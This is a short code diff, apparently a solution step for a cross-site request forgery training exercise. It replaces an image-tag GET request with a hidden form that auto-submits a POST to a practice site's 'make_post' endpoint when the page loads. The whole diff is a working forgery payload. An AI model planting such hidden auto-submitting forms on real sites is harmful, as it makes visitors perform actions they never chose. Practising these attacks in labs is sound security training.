@@ -1,1 +1,9 @@
-<img src="https://csrf.websecurity.church/make_post/1?post=achat" />
+<form id="post_form" action="https://csrf.websecurity.church/make_post/2" method="POST" style="display: none;">
+            <textarea name="post"></textarea>
+            <input type="submit" value="submit">
+ </form>
+
+<script>
+  document.getElementsByName("post")[0].value="achat";
+  document.getElementById("post_form").submit();
+</script>
